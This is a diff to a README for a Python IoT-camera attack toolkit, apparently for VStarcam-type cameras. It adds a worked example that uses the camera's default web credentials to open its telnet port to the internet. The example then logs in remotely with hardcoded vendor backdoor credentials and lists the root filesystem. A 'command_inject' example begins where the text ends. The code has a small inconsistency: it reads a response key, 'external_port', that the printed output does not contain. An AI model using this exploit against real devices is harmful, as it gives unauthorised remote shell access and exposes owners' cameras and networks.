@@ -1,5 +1,56 @@
 # python-yatwin: /yatwin/scripts/
 
+### Example: bypass_firewall_telnet
+```python
+>>> from yatwin.scripts import bypass_firewall_telnet
+>>> from yatwin.interfaces import Http, Telnet
+>>> from pprint import pprint
+>>>
+>>> # Camera HTTP Information
+>>> HOST = '192.168.1.236'
+>>> USERNAME = 'admin'
+>>> PASSWORD = '888888'
+>>> PORT = 80
+>>> 
+>>> # Create a Http instance
+>>> http = Http(HOST, username = USERNAME, password = PASSWORD, port = PORT)
+>>> http
+<Http(admin:888888@192.168.1.236:80)>
+>>> 
+>>> # Bypass firewall
+>>> resp = bypass_firewall_telnet(http)
+>>> pprint(resp)
+{'_success': True,
+ 'external_host': '85.173.84.29',
+ 'external_telnet_port': 1025,
+ 'internal_host': '192.168.1.236',
+ 'internal_telnet_port': 1025}
+ >>>
+ >>> # Camera Telnet Information
+ >>> TELNET_USERNAME = 'vstarcam2015'
+ >>> TELNET_PASSWORD = '20150602'
+ >>>
+ >>> # Create (external!) Telnet instance
+ >>> telnet = Telnet \
+ (
+ 	resp['external_host'], 
+	username = TELNET_USERNAME, 
+	password = TELNET_PASSWORD, 
+	port = resp['external_port']
+)
+>>> telnet
+<Telnet(vstarcam2015:20150602@85.173.84.29:1025)>
+>>>
+>>> # Prove it works
+>>> print(telnet.ls())
+bin            init           mknod_console  root           tmp
+boot           lib            mnt            sbin           usr
+dev            linuxrc        nfsroot        share          var
+etc            lost+found     opt            sys
+home           mkimg.rootfs   proc           system
+>>>
+```
+
 ### Example: command_inject
 ```python
 >>> from yatwin.scripts import command_inject
